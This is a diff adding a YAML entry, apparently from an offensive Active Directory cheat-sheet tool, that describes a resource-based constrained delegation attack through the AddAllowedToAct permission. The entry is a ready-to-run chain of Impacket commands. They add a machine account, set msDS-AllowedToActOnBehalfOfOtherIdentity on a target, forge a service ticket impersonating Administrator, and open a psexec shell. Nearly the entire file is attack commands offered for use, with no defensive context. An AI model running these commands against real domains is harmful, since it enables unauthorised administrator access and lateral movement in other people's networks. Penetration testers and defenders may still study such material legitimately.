@@ -1,0 +1,15 @@
+name: AddAllowedToAct
+description: AddAllowedToAct permission allows setting up RBCD attacks
+commands:
+- '# Add computer account (if MAQ > 0)'
+- addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# Set msDS-AllowedToActOnBehalfOfOtherIdentity'
+- rbcd.py -delegate-to '<TARGET$>' -delegate-from 'YOURPC$' '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# Impersonate admin'
+- getST.py -spn 'cifs/<TARGET>' -impersonate Administrator '<DOMAIN>/YOURPC$:Password123'
+- export KRB5CCNAME=Administrator.ccache
+- psexec.py -k -no-pass <TARGET>
+opsec: []
+references: []
